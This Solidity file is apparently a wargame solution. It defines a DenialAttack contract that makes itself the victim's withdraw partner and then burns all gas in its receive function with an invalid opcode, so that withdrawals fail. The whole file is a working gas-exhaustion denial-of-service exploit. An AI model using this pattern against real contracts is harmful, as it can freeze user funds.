// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/20-IDenial.sol";

contract DenialAttack {
    IDenial public immutable victimDenial;

    constructor(IDenial victimDenial_) {
        victimDenial = victimDenial_;
    }

    function attack() external {
        victimDenial.setWithdrawPartner(address(this));

        require(
            address(this) == victimDenial.partner(),
            "Denial: Wrong address"
        );

        victimDenial.withdraw();
    }

    /// @dev assert(false) is not consume all of gas for solidity > 0.8.5
    receive() external payable {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            invalid()
        }
    }
}
